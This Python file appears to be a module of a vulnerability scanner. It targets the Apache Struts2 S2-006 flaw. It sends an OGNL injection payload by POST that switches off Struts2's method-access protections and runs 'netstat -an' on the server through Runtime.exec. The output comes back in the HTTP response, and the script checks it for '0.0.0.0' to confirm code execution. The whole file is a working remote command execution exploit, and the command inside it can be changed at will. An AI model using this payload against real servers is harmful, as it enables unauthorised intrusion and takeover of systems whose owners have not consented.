import requests
# url随意
class struts2_006:
    def __init__(self, url):
        self.url = url

    def attack(self):
        print('test {} --> struts2_006'.format(self.url))
        headers = {"Content-Type": "application/x-www-form-urlencoded"}
        exp = '''('\43_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('\43context[\'xwork.MethodAccessor.denyMethodExecution\']\75false')(b))&('\43c')(('\43_memberAccess.excludeProperties\75@java.util.Collections@EMPTY_SET')(c))&(g)(('\43mycmd\75\'netstat -an\'')(d))&(h)(('\43myret\75@java.lang.Runtime@getRuntime().exec(\43mycmd)')(d))&(i)(('\43mydat\75new\40java.io.DataInputStream(\43myret.getInputStream())')(d))&(j)(('\43myres\75new\40byte[51020]')(d))&(k)(('\43mydat.readFully(\43myres)')(d))&(l)(('\43mystr\75new\40java.lang.String(\43myres)')(d))&(m)(('\43myout\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(n)(('\43myout.getWriter().println(\43mystr)')(d))'''
        try:
            resp = requests.post(self.url, data=exp, headers=headers, timeout=10)
            if "0.0.0.0" in resp.text:
                return "s2-006"
        except:
            #print('test --> struts2_006 Failed!')
            return None